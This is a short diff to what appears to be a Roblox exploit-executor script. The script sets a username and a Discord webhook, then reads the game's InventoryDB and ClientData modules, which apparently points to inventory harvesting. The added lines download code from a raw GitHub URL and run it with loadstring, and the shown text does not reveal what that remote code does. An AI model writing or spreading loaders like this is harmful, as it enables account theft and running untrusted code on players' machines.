@@ -1,6 +1,16 @@
 Username = "kely5171"
 Webhook = "https://discord.com/api/webhooks/"
 
+if getgenv().ui == nil then
+    getgenv().ui = true
+end
+if getgenv().ui == true then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/refs/heads/main/HUB/ADMTKD"))()
+    print("True GUI")
+elseif getgenv().ui == false then
+    print("False GUI")
+end
+
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
 local ClientData = Loads('ClientData')
